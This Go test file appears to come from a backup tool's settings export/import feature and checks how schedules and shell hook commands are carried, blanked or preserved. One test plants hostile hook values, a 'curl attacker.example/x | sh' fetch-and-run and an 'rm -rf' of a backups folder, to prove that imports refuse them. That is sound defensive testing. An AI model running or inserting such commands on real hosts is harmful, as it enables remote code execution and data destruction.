package api

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/junkerderprovinz/bombvault/internal/store"
)

// withEverything stores a whole-server pass schedule and its hooks.
func withEverything(t *testing.T, st *store.Repo, schedule, pre, post string) {
	t.Helper()
	s, err := st.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	s.EverythingSchedule = schedule
	s.EverythingPreHook = pre
	s.EverythingPostHook = post
	if err := st.UpdateSettings(s); err != nil {
		t.Fatal(err)
	}
}

func TestImportCarriesEverythingSchedule(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "daily 04:00", "", "curl -fsS https://hc-ping.com/uuid")

	body, exp := doExport(t, src, "")
	if exp.Settings.EverythingSchedule != "daily 04:00" {
		t.Fatalf("precondition: the export must carry the cadence, got %q", exp.Settings.EverythingSchedule)
	}

	dst, dstStore := newPortableHandler(t, appKeyB)
	if env := doImport(t, dst, body, "?apply=true"); env["ok"] != true {
		t.Fatalf("apply failed: %v", env)
	}

	got, err := dstStore.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got.EverythingSchedule != "daily 04:00" {
		t.Fatalf("everythingSchedule = %q after import, want \"daily 04:00\"; an import that clears it switches the whole-server pass off", got.EverythingSchedule)
	}
}

func TestImportKeepsDestinationEverythingHooks(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore) // the source has no whole-server pass
	body, _ := doExport(t, src, "")

	dst, dstStore := newPortableHandler(t, appKeyB)
	withEverything(t, dstStore, "everyN 7 03:00", "/usr/local/bin/pre.sh", "curl -fsS https://hc-ping.com/dst-uuid")

	if env := doImport(t, dst, body, "?apply=true"); env["ok"] != true {
		t.Fatalf("apply failed: %v", env)
	}

	got, err := dstStore.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got.EverythingPostHook != "curl -fsS https://hc-ping.com/dst-uuid" {
		t.Fatalf("post-hook = %q; the dead-man's-switch ping was deleted by an import", got.EverythingPostHook)
	}
	if got.EverythingPreHook != "/usr/local/bin/pre.sh" {
		t.Fatalf("pre-hook = %q; an import must not clear it", got.EverythingPreHook)
	}
}

// Hooks are shell commands this host runs, and a settings file can come from
// anyone, so an import never sets them.
func TestImportedFileCannotInstallHookCommands(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "daily 04:00", "", "")

	body, _ := doExport(t, src, "")

	// Added by hand, because the export blanks the hooks.
	var raw map[string]any
	if err := json.Unmarshal(body, &raw); err != nil {
		t.Fatal(err)
	}
	settings := raw["settings"].(map[string]any)
	settings["everythingPreHook"] = "curl attacker.example/x | sh"
	settings["everythingPostHook"] = "rm -rf /host/user/backups"
	hostile, err := json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}

	dst, dstStore := newPortableHandler(t, appKeyB)
	if env := doImport(t, dst, hostile, "?apply=true"); env["ok"] != true {
		t.Fatalf("apply failed: %v", env)
	}

	got, err := dstStore.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got.EverythingPreHook != "" || got.EverythingPostHook != "" {
		t.Fatalf("an imported file installed a host command: pre=%q post=%q", got.EverythingPreHook, got.EverythingPostHook)
	}
	// The rest of the file still applies.
	if got.EverythingSchedule != "daily 04:00" {
		t.Fatalf("everythingSchedule = %q, want the imported cadence", got.EverythingSchedule)
	}
}

// A hook is usually a monitoring ping whose URL is its credential.
func TestExportOmitsHookCommands(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "daily 04:00", "/usr/local/bin/pre.sh", "curl -fsS https://hc-ping.com/secret-uuid")

	body, exp := doExport(t, src, "?includeCredentials=true")
	if exp.Settings.EverythingPreHook != "" || exp.Settings.EverythingPostHook != "" {
		t.Fatalf("hooks exported: pre=%q post=%q", exp.Settings.EverythingPreHook, exp.Settings.EverythingPostHook)
	}
	if strings.Contains(string(body), "hc-ping.com/secret-uuid") {
		t.Fatal("the dead-man's-switch URL leaked into the export file")
	}
}

// An apply can switch the whole-server pass on, so the preview lists it as its
// own area instead of folding it into "schedules".
func TestImportPreviewNamesTheEverythingArea(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "everyN 3 04:00", "", "")

	_, exp := doExport(t, src, "")
	groups := settingsGroups(exp.Settings)
	found := false
	for _, g := range groups {
		if g == "everything" {
			found = true
		}
	}
	if !found {
		t.Fatalf("preview areas = %v, want one naming the whole-server pass", groups)
	}
}

// Whatever the mapper does not assign keeps its stored value, so a column added
// to store.Settings later is not wiped by an import.
func TestImportKeepsFieldsTheFileDoesNotSet(t *testing.T) {
	existing := store.Settings{
		AuthPasswordHash:   "keep-me",
		SessionEpoch:       "epoch-7",
		RecoveryKitAck:     true,
		MetricsToken:       "metrics-token",
		WidgetToken:        "widget-token",
		FleetToken:         "fleet-token",
		FleetEnabled:       true,
		InstanceName:       "bottich",
		RcloneConf:         "rclone-blob",
		NotifyConf:         "notify-blob",
		CloudConf:          "cloud-blob",
		EverythingPreHook:  "pre.sh",
		EverythingPostHook: "post.sh",
		ContainersSchedule: "daily 02:00",
	}
	out := mergeImportedSettings(existing, settingsView{ContainersSchedule: "weekly Sun 05:00"})

	if out.ContainersSchedule != "weekly Sun 05:00" {
		t.Fatalf("the imported field did not apply: %q", out.ContainersSchedule)
	}
	for _, c := range []struct {
		name string
		got  string
		want string
	}{
		{"AuthPasswordHash", out.AuthPasswordHash, "keep-me"},
		{"MetricsToken", out.MetricsToken, "metrics-token"},
		{"WidgetToken", out.WidgetToken, "widget-token"},
		{"FleetToken", out.FleetToken, "fleet-token"},
		{"InstanceName", out.InstanceName, "bottich"},
		{"RcloneConf", out.RcloneConf, "rclone-blob"},
		{"NotifyConf", out.NotifyConf, "notify-blob"},
		{"CloudConf", out.CloudConf, "cloud-blob"},
		{"EverythingPreHook", out.EverythingPreHook, "pre.sh"},
		{"EverythingPostHook", out.EverythingPostHook, "post.sh"},
	} {
		if c.got != c.want {
			t.Errorf("%s = %q, want %q; an import wiped a field it does not carry", c.name, c.got, c.want)
		}
	}
	if !out.FleetEnabled || !out.RecoveryKitAck || out.SessionEpoch != "epoch-7" {
		t.Errorf("per-instance state lost: fleetEnabled=%v recoveryKitAck=%v sessionEpoch=%q",
			out.FleetEnabled, out.RecoveryKitAck, out.SessionEpoch)
	}
}
